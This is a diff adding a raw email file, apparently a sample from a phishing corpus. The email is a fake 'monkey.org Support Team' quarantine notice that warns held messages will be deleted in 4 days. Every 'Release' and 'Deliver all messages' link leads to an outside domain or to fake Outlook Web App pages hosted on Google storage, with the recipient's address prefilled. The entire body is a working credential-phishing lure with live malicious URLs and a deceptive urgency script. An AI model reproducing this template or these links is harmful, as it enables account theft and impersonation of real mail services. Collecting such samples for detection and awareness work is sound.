@@ -1,0 +1,382 @@
+Return-Path: tr@accoladeweatherscreens.com.au
+Delivered-To: jose@monkey.org
+X-FDA: 78036238140.60.8A5AC00
+Received: from ded3531.inmotionhosting.com (server.dmh.tools [104.247.74.39])
+	by imf28.b.hostedemail.com (Postfix) with ESMTP id E23C11808E55E
+	for <jose@monkey.org>; Thu, 15 Apr 2021 23:46:29 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=accoladeweatherscreens.com.au; s=default; h=Content-Transfer-Encoding:
+	Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
+	List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
+	 bh=3y+RxCNPRiEGApfaLNsIAfPsmwFzfFr9eHwDxgPy0rU=; b=t3pW6H8fBOoFm/uDmN2DSpiO0
+	3csz6orQaD4GhqKX0e4vP+OoE9/aooc61U3Xh7sOSpA7B0GIsW0Kr/nzjdqvMrkzApO5ZCNiRKwmz
+	PLl7x+FT9RUWWxJtE+jp8Ha/GYB6wKk61/FCDZgvlgKWsGdXneXdrCF2A+nXN95oAJUK0Ed4H5zpf
+	iuY0nrqB/ufg6VOxfCEPQ42lIfcM8dMpz/E1qhvXB5ks5B8ixyFmtkYoFX0r3gEowq6GXwLZ+MbFd
+	HN7Eq7rp1wvzvRn0Mzj4WEuj998F2rhbdgJ6OF3vSLIxWKyAzWNjfiS1YwGSoY1esCO1vv63fIs7y
+	TfXS2cFVQ==;
+Received: from [188.93.233.28] (port=52283 helo=accoladeweatherscreens.com.au)
+	by ded3531.inmotionhosting.com with esmtpa (Exim 4.94)
+	(envelope-from <tr@accoladeweatherscreens.com.au>)
+	id 1lXBgm-0002u4-GZ
+	for jose@monkey.org; Thu, 15 Apr 2021 16:46:29 -0700
+From: monkey.org  <tr@accoladeweatherscreens.com.au>
+To: jose@monkey.org
+Subject: Important Update
+Date: 15 Apr 2021 16:46:23 -0700
+Message-ID: <20210415164621.00F184E921AFCFA1@accoladeweatherscreens.com.au>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-OutGoing-Spam-Status: No, score=2.6
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - ded3531.inmotionhosting.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - accoladeweatherscreens.com.au
+X-Get-Message-Sender-Via: ded3531.inmotionhosting.com: authenticated_id:
+ tr@accoladeweatherscreens.com.au
+X-Authenticated-Sender:
+ ded3531.inmotionhosting.com: tr@accoladeweatherscreens.com.au
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: E23C11808E55E
+X-Spam-Status: No, score=2.96
+X-Stat-Signature: cqhbotx87trqbj7sqd8ywf1j79wg58di
+Received-SPF: none (accoladeweatherscreens.com.au>: No applicable sender
+ policy available) receiver=imf28.b.tucows.com; identity=mailfrom;
+ envelope-from="<tr@accoladeweatherscreens.com.au>";
+ helo=ded3531.inmotionhosting.com; client-ip=104.247.74.39
+X-HE-DKIM-Result: pass/pass
+X-HE-Tag: 1618530389-215210
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 30
+
+<HTML><HEAD><TITLE></TITLE>
+<META charset=3Dutf-8>
+<META name=3Dviewport content=3D"width=3Ddevice-width, initial-scale=3D1.0"=
+>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<DIV class=3D"ns-view-message-body ns-view-id-376 mail-Message-Body js-mess=
+age-body" style=3D"FONT-SIZE: 15px; OVERFLOW: auto; POSITION: relative; PAD=
+DING-BOTTOM: 10px; PADDING-TOP: 20px; PADDING-LEFT: 20px; Z-INDEX: 1; PADDI=
+NG-RIGHT: 32px" data-key=3D"view=3Dmessage-body&amp;withoutSigns=3Dtrue&amp=
+;ids=3D175358910490738726&amp;is_spam=3Dfalse&amp;raw=3Dfalse&amp;frequency=
+=3D0&amp;draft=3Dfalse">
+<DIV class=3D"js-message-body-content mail-Message-Body-Content" style=3D"M=
+ARGIN-RIGHT: 231px; overflow-wrap: break-word">
+<DIV dir=3Dltr>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">Dear =
+jose@monkey.org ,</DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><BR><=
+/DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><BR>Y=
+our incoming messages have been placed on hold due to your email server err=
+or.</DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><BR><=
+/DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><BR><=
+/DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">This =
+pending messages will be deleted automatically after 4 days. &nbsp;</DIV></=
+DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; PADDING-RIGHT: 0px"><B style=3D"FONT-SIZE: 12px; FONT-FAMILY: ari=
+al; COLOR: rgb(255,0,0)">
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><STRO=
+NG><BR></STRONG></DIV></B></DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; PADDING-RIGHT: 0px"><B style=3D"FONT-SIZE: 12px; FONT-FAMILY: ari=
+al; COLOR: rgb(255,0,0)">
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">Kindl=
+y update your server error to enable your pending messages come up.</DIV></=
+B></DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; PADDING-RIGHT: 0px"><B style=3D"FONT-SIZE: 12px; FONT-FAMILY: ari=
+al; COLOR: rgb(255,0,0)">
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><SPAN=
+ style=3D"FONT-WEIGHT: normal; COLOR: rgb(34,34,34)"><BR></SPAN></DIV></B><=
+/DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; PADDING-RIGHT: 0px"><B style=3D"FONT-SIZE: 12px; FONT-FAMILY: ari=
+al; COLOR: rgb(255,0,0)">
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><SPAN=
+ style=3D"FONT-WEIGHT: normal; COLOR: rgb(34,34,34)">Few of your pending me=
+ssages are listed below along with the actions that can be taken.</SPAN></D=
+IV></B></DIV>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; PADDING-RIGHT: 0px"><B style=3D"FONT-SIZE: 12px; FONT-FAMILY: ari=
+al; COLOR: rgb(255,0,0)">
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><SPAN=
+ style=3D"FONT-SIZE: small; FONT-WEIGHT: normal; COLOR: rgb(34,34,34)"><BR>=
+
+To see all quarantined messages view&nbsp;<A class=3Ddaria-goto-anchor styl=
+e=3D"COLOR: rgb(1,134,186)" href=3D"https://update.tamanigalubeach.com/upda=
+te/index.html#jose@monkey.org" rel=3D"noopener noreferrer" target=3D_blank=
+=20
+data-vdir-href=3D"https://mail.yandex.com/re.jsx?uid=3D1395388618&amp;c=3DL=
+IZA&amp;cv=3D24.16.0&amp;mid=3D175358910490738726&amp;h=3Da,y3hLeE70V_dtcDN=
+_jyPB2Q&amp;l=3DaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL291dGxvb2std2ViLWF=
+wcDIyNDIwLmFwcHNwb3QuY29tLyUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JT=
+I1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNS9vd=
+2F3ZWJhcHAuaHRtbCNbWy1FbWFpbC1dXQ"=20
+data-orig-href=3D"https://storage.googleapis.com/outlook-web-app22420.appsp=
+ot.com/%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%25=
+25%2525%2525%2525%2525/owawebapp.html#jose@monkey.org">update email server<=
+/A> and release to inbox</SPAN><SPAN style=3D"FONT-WEIGHT: normal; COLOR: r=
+gb(34,34,34)"><BR style=3D"FONT-SIZE: small; FONT-FAMILY: arial, helvetica,=
+ sans-serif">&nbsp;</SPAN></DIV></B></DIV>
+<P><BR></P>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><B st=
+yle=3D"FONT-SIZE: 12px; COLOR: rgb(255,0,0)"><SPAN style=3D"FONT-WEIGHT: no=
+rmal; COLOR: rgb(34,34,34)">
+<DIV style=3D"FONT-SIZE: small; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADD=
+ING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">
+<table style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 11px; FONT-FAMILY: verda=
+na, arial, sans-serif; BORDER-RIGHT-WIDTH: 0px; WIDTH: 872px; BORDER-BOTTOM=
+-WIDTH: 0px; BORDER-COLLAPSE: collapse; COLOR: rgb(0,0,0); PADDING-BOTTOM: =
+0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: normal;=
+ PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" cellspacing=3D"0" cellpadding=
+=3D"0" border=3D"0">
+<THEAD>
+<TR>
+<TH style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 92px; VERTICAL-=
+ALIGN: bottom; FONT-WEIGHT: normal; PADDING-BOTTOM: 4px; TEXT-ALIGN: left; =
+PADDING-TOP: 4px; PADDING-LEFT: 6px; BORDER-LEFT: rgb(170,170,170) 1px soli=
+d; MARGIN: 0px; PADDING-RIGHT: 6px; BACKGROUND-COLOR: rgb(251,251,251)">&nb=
+sp;</TH>
+<TH style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 249px; VERTICAL=
+-ALIGN: bottom; FONT-WEIGHT: normal; PADDING-BOTTOM: 4px; TEXT-ALIGN: left;=
+ PADDING-TOP: 4px; PADDING-LEFT: 6px; BORDER-LEFT: rgb(170,170,170) 1px sol=
+id; MARGIN: 0px; PADDING-RIGHT: 6px; BACKGROUND-COLOR: rgb(251,251,251)">Re=
+cipient:</TH>
+<TH style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 379px; VERTICAL=
+-ALIGN: bottom; FONT-WEIGHT: normal; PADDING-BOTTOM: 4px; TEXT-ALIGN: left;=
+ PADDING-TOP: 4px; PADDING-LEFT: 6px; BORDER-LEFT: rgb(170,170,170) 1px sol=
+id; MARGIN: 0px; PADDING-RIGHT: 6px; BACKGROUND-COLOR: rgb(251,251,251)">Su=
+bject:</TH>
+<TH style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; BORDER-RIGHT: rgb(170,=
+170,170) 1px solid; WIDTH: 99px; VERTICAL-ALIGN: bottom; FONT-WEIGHT: norma=
+l; PADDING-BOTTOM: 4px; TEXT-ALIGN: left; PADDING-TOP: 4px; PADDING-LEFT: 6=
+px; BORDER-LEFT: rgb(170,170,170) 1px solid; MARGIN: 0px; PADDING-RIGHT: 6p=
+x; BACKGROUND-COLOR: rgb(251,251,251)">date:</TH></TR></THEAD>
+<THEAD>
+<TR>
+<TH style=3D"FONT-WEIGHT: normal; COLOR: rgb(255,255,255); PADDING-BOTTOM: =
+4px; TEXT-ALIGN: left; PADDING-TOP: 4px; PADDING-LEFT: 4px; MARGIN: 0px; PA=
+DDING-RIGHT: 4px; BACKGROUND-COLOR: rgb(69,90,115)" colSpan=3D4><STRONG>Qua=
+rantined email</STRONG></TH></TR></THEAD>
+<TBODY>
+<TR vAlign=3Dtop>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 98px; WHITE-SPA=
+CE: nowrap; PADDING-BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDE=
+R-LEFT: rgb(170,170,170) 1px solid; PADDING-RIGHT: 3px">
+<A class=3Ddaria-goto-anchor style=3D"COLOR: rgb(0,125,188)" href=3D"https:=
+//update.tamanigalubeach.com/update/index.html#jose@monkey.org" rel=3D"noop=
+ener noreferrer" target=3D_blank=20
+data-vdir-href=3D"https://mail.yandex.com/re.jsx?uid=3D1395388618&amp;c=3DL=
+IZA&amp;cv=3D24.16.0&amp;mid=3D175358910490738726&amp;h=3Da,y3hLeE70V_dtcDN=
+_jyPB2Q&amp;l=3DaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL291dGxvb2std2ViLWF=
+wcDIyNDIwLmFwcHNwb3QuY29tLyUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JT=
+I1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNS9vd=
+2F3ZWJhcHAuaHRtbCNbWy1FbWFpbC1dXQ"=20
+data-orig-href=3D"https://storage.googleapis.com/outlook-web-app22420.appsp=
+ot.com/%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%25=
+25%2525%2525%2525%2525/owawebapp.html#jose@monkey.org">Release</A></TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 255px; PADDING-=
+BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,=
+170) 1px solid; PADDING-RIGHT: 3px">&nbsp;(jose@monkey.org )</TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 385px; PADDING-=
+BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,=
+170) 1px solid; PADDING-RIGHT: 3px">Remittance Payment Advice for FOY</TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; BORDER-RIGHT: rgb(170,=
+170,170) 1px solid; WIDTH: 105px; WHITE-SPACE: nowrap; PADDING-BOTTOM: 3px;=
+ PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,170) 1px sol=
+id; PADDING-RIGHT: 3px">03/29/2021</TD></TR>
+<TR vAlign=3Dtop>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 98px; WHITE-SPA=
+CE: nowrap; PADDING-BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDE=
+R-LEFT: rgb(170,170,170) 1px solid; PADDING-RIGHT: 3px">
+<A class=3Ddaria-goto-anchor style=3D"COLOR: rgb(1,134,186)" href=3D"https:=
+//update.tamanigalubeach.com/update/index.html#jose@monkey.org" rel=3D"noop=
+ener noreferrer" target=3D_blank=20
+data-vdir-href=3D"https://mail.yandex.com/re.jsx?uid=3D1395388618&amp;c=3DL=
+IZA&amp;cv=3D24.16.0&amp;mid=3D175358910490738726&amp;h=3Da,y3hLeE70V_dtcDN=
+_jyPB2Q&amp;l=3DaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL291dGxvb2std2ViLWF=
+wcDIyNDIwLmFwcHNwb3QuY29tLyUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JT=
+I1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNS9vd=
+2F3ZWJhcHAuaHRtbCNbWy1FbWFpbC1dXQ"=20
+data-orig-href=3D"https://storage.googleapis.com/outlook-web-app22420.appsp=
+ot.com/%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%25=
+25%2525%2525%2525%2525/owawebapp.html#jose@monkey.org">Release</A></TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 255px; PADDING-=
+BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,=
+170) 1px solid; PADDING-RIGHT: 3px">&nbsp;(jose@monkey.org ) &nbsp;<BR></TD=
+>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 385px; PADDING-=
+BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,=
+170) 1px solid; PADDING-RIGHT: 3px">Re: Re: Contract</TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; BORDER-RIGHT: rgb(170,=
+170,170) 1px solid; WIDTH: 105px; WHITE-SPACE: nowrap; PADDING-BOTTOM: 3px;=
+ PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,170) 1px sol=
+id; PADDING-RIGHT: 3px">03/29/2021</TD></TR>
+<TR vAlign=3Dtop>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 98px; WHITE-SPA=
+CE: nowrap; PADDING-BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDE=
+R-LEFT: rgb(170,170,170) 1px solid; PADDING-RIGHT: 3px">
+<A class=3Ddaria-goto-anchor style=3D"COLOR: rgb(1,134,186)" href=3D"https:=
+//update.tamanigalubeach.com/update/index.html#jose@monkey.org" rel=3D"noop=
+ener noreferrer" target=3D_blank=20
+data-vdir-href=3D"https://mail.yandex.com/re.jsx?uid=3D1395388618&amp;c=3DL=
+IZA&amp;cv=3D24.16.0&amp;mid=3D175358910490738726&amp;h=3Da,y3hLeE70V_dtcDN=
+_jyPB2Q&amp;l=3DaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL291dGxvb2std2ViLWF=
+wcDIyNDIwLmFwcHNwb3QuY29tLyUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JT=
+I1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNS9vd=
+2F3ZWJhcHAuaHRtbCNbWy1FbWFpbC1dXQ"=20
+data-orig-href=3D"https://storage.googleapis.com/outlook-web-app22420.appsp=
+ot.com/%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%25=
+25%2525%2525%2525%2525/owawebapp.html#jose@monkey.org">Release</A></TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 255px; PADDING-=
+BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,=
+170) 1px solid; PADDING-RIGHT: 3px">&nbsp;(jose@monkey.org ) &nbsp;<BR></TD=
+>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 385px; PADDING-=
+BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,=
+170) 1px solid; PADDING-RIGHT: 3px">
+<A class=3Ddaria-goto-anchor style=3D"COLOR: rgb(34,34,34)" href=3D"https:/=
+/update.tamanigalubeach.com/server/index.html#jose@monkey.org" rel=3D"noope=
+ner noreferrer" target=3D_blank data-vdir-href=3D"https://mail.yandex.com/r=
+e.jsx?uid=3D1395388618&amp;c=3DLIZA&amp;cv=3D24.16.0&amp;mid=3D175358910490=
+738726&amp;h=3Da,21wWXikQaGuAlCIYnkSIWg&amp;l=3DaHR0cHM6Ly9zdG9yYWdlLmdvb2d=
+sZWFwaXMuY29tL291dGxvb2std2ViLWFwcDIyNDIwLmFwcHNwb3QuY29tLyUyNTI1JTI1MjUlMj=
+UyNSUyNTI1JTI1MjUvb3dhd2ViLmh0bWwjW1stRW1haWwtXV0"=20
+data-orig-href=3D"https://storage.googleapis.com/outlook-web-app22420.appsp=
+ot.com/%2525%2525%2525%2525%2525/owaweb.html#jose@monkey.org">Re: SALES ORD=
+ER CONFIRMATION</A></TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; BORDER-RIGHT: rgb(170,=
+170,170) 1px solid; WIDTH: 105px; WHITE-SPACE: nowrap; PADDING-BOTTOM: 3px;=
+ PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,170) 1px sol=
+id; PADDING-RIGHT: 3px">03/29/2021</TD></TR>
+<TR vAlign=3Dtop>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 98px; WHITE-SPA=
+CE: nowrap; PADDING-BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDE=
+R-LEFT: rgb(170,170,170) 1px solid; PADDING-RIGHT: 3px">
+<A class=3Ddaria-goto-anchor style=3D"COLOR: rgb(1,134,186)" href=3D"https:=
+//update.tamanigalubeach.com/update/index.html#jose@monkey.org" rel=3D"noop=
+ener noreferrer" target=3D_blank=20
+data-vdir-href=3D"https://mail.yandex.com/re.jsx?uid=3D1395388618&amp;c=3DL=
+IZA&amp;cv=3D24.16.0&amp;mid=3D175358910490738726&amp;h=3Da,y3hLeE70V_dtcDN=
+_jyPB2Q&amp;l=3DaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL291dGxvb2std2ViLWF=
+wcDIyNDIwLmFwcHNwb3QuY29tLyUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JT=
+I1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNS9vd=
+2F3ZWJhcHAuaHRtbCNbWy1FbWFpbC1dXQ"=20
+data-orig-href=3D"https://storage.googleapis.com/outlook-web-app22420.appsp=
+ot.com/%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%25=
+25%2525%2525%2525%2525/owawebapp.html#jose@monkey.org">Release</A></TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 255px; PADDING-=
+BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,=
+170) 1px solid; PADDING-RIGHT: 3px">&nbsp;(jose@monkey.org ) &nbsp;<BR></TD=
+>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; WIDTH: 385px; PADDING-=
+BOTTOM: 3px; PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,=
+170) 1px solid; PADDING-RIGHT: 3px">
+<A class=3Ddaria-goto-anchor style=3D"COLOR: rgb(34,34,34)" href=3D"https:/=
+/update.tamanigalubeach.com/server/index.html#jose@monkey.org" rel=3D"noope=
+ner noreferrer" target=3D_blank data-vdir-href=3D"https://mail.yandex.com/r=
+e.jsx?uid=3D1395388618&amp;c=3DLIZA&amp;cv=3D24.16.0&amp;mid=3D175358910490=
+738726&amp;h=3Da,21wWXikQaGuAlCIYnkSIWg&amp;l=3DaHR0cHM6Ly9zdG9yYWdlLmdvb2d=
+sZWFwaXMuY29tL291dGxvb2std2ViLWFwcDIyNDIwLmFwcHNwb3QuY29tLyUyNTI1JTI1MjUlMj=
+UyNSUyNTI1JTI1MjUvb3dhd2ViLmh0bWwjW1stRW1haWwtXV0"=20
+data-orig-href=3D"https://storage.googleapis.com/outlook-web-app22420.appsp=
+ot.com/%2525%2525%2525%2525%2525/owaweb.html#jose@monkey.org">DHL Express S=
+hipment 773017357361 Notification</A></TD>
+<td style=3D"BORDER-TOP: rgb(170,170,170) 1px solid; BORDER-RIGHT: rgb(170,=
+170,170) 1px solid; WIDTH: 105px; WHITE-SPACE: nowrap; PADDING-BOTTOM: 3px;=
+ PADDING-TOP: 3px; PADDING-LEFT: 3px; BORDER-LEFT: rgb(170,170,170) 1px sol=
+id; PADDING-RIGHT: 3px">03/29/2021</TD></TR>
+<TR>
+<td style=3D"PADDING-BOTTOM: 4px; TEXT-ALIGN: right; PADDING-TOP: 4px; PADD=
+ING-LEFT: 6px; PADDING-RIGHT: 6px; BACKGROUND-COLOR: rgb(192,192,192)" cols=
+pan=3D"4">
+<A class=3Ddaria-goto-anchor style=3D"COLOR: rgb(1,134,186)" href=3D"https:=
+//update.tamanigalubeach.com/update/index.html#jose@monkey.org" rel=3D"noop=
+ener noreferrer" target=3D_blank=20
+data-vdir-href=3D"https://mail.yandex.com/re.jsx?uid=3D1395388618&amp;c=3DL=
+IZA&amp;cv=3D24.16.0&amp;mid=3D175358910490738726&amp;h=3Da,y3hLeE70V_dtcDN=
+_jyPB2Q&amp;l=3DaHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL291dGxvb2std2ViLWF=
+wcDIyNDIwLmFwcHNwb3QuY29tLyUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JT=
+I1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNSUyNTI1JTI1MjUlMjUyNS9vd=
+2F3ZWJhcHAuaHRtbCNbWy1FbWFpbC1dXQ"=20
+data-orig-href=3D"https://storage.googleapis.com/outlook-web-app22420.appsp=
+ot.com/%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%2525%25=
+25%2525%2525%2525%2525/owawebapp.html#jose@monkey.org"><STRONG>Deliver all =
+messages</STRONG></A></TD></TR></TBODY></TABLE></DIV></SPAN></B></DIV>
+<P><BR></P>
+<P><BR></P>
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">
+<DIV style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MAR=
+GIN: 0px; DISPLAY: inline; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px"><B st=
+yle=3D"FONT-SIZE: 12px; FONT-FAMILY: arial; COLOR: rgb(255,0,0)"><SPAN styl=
+e=3D"COLOR: rgb(34,34,34)"><BR><BR style=3D"FONT-FAMILY: arial, helvetica, =
+sans-serif">&nbsp;</SPAN></B></DIV><B style=3D"FONT-SIZE: 12px; FONT-FAMILY=
+: arial; COLOR: rgb(255,0,0)"><SPAN style=3D"COLOR: rgb(34,34,34)"><BR></SP=
+AN><SPAN style=3D"COLOR: rgb(85,85,85)">
+&nbsp;Note : This message was sent by the system for notification only. &nb=
+sp;</SPAN> Please do not reply<BR><BR>If this message lands in your spam fo=
+lder, please move it to your inbox folder for proper interrogation:</B> </D=
+IV>
+<P><BR></P>
+<P><BR style=3D'FONT-SIZE: medium; FONT-FAMILY: "times new roman"; COLOR: r=
+gb(51,51,51)'>Regards,<BR>monkey.org Support Team.<SPAN style=3D'FONT-SIZE:=
+ 11px; FONT-FAMILY: "lucida grande", verdana, arial, helvetica, sans-serif;=
+ COLOR: rgb(51,51,51)'>&nbsp; <BR>&#9400; 2021 Cyber Security Alert . All R=
+ights Reserved.&nbsp;</SPAN></P></DIV></DIV></DIV>
+<DIV class=3D"ns-view-message-quick-reply ns-view-id-378 mail-QuickReply_co=
